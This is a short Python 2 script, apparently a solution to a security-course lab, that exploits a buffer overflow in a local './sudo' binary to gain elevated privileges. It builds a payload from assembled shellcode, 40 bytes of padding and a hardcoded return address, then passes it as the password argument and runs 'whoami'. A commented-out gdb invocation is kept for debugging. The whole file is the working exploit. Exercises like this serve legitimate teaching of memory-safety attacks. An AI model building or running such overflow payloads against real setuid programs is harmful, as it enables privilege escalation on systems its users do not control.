import os, sys
import assemble


PATH_TO_SUDO = './sudo'


def run_shell():
    # Your code here



    cmd = "whoami"
    shellcode = assemble.assemble_file('shellcode.asm')

    return_address = '\x69\xe0\xff\xbf' #'0xbfffe069'
  
    padding = "A" * 40

    password = shellcode + padding + return_address


    os.execl (PATH_TO_SUDO, PATH_TO_SUDO, password, cmd)

    #for debugging
    #os.execl('/usr/bin/gdb', '/usr/bin/gdb', '-ex=r', '--args', './sudo', password, "ls")



def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    run_shell()


if __name__ == '__main__':
    main(sys.argv)
